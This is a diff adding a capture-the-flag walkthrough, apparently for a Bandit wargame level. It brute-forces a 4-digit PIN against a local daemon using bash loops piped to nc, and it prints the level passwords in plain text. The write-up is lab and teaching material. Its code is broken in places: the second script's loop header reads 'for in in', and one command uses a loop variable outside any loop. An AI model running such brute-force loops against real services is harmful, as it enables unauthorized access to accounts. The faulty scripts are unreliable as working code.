@@ -1,0 +1,41 @@
+In this level we know that there is a deamon running on port 30002 and it will give us the password
+for the next level if we supply it with the password of bandit24 plus a 4 digit secret pincode
+so in order to know that 4 digit pincode we had to bruteforce it 
+
+so we create a small script in bash for bruteforcing the pin and pip that pin with the password of
+the current user 
+
+#!/bin/bash
+
+for i in {9999..0000}
+do
+    echo $i
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002 | grep "Correct"
+done
+
+by running this script we get that pincode
+and after that we run the command 
+echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002
+
+to get the password for bandit25
+and the password for bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+althought it is very slow process, in order to make it fast what we can do it
+just made some changes in out original script to redirect it to a file
+
+#!/bin/bash
+
+for in in {9999..0000}
+do
+    echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+
+and just redirect it to a file
+./brute.sh > brute.txt
+
+now just pipe this text file to nc with the command
+
+cat brute.txt | nc localhost 30002
+
+and this will give you the password in a matter of seconds
+
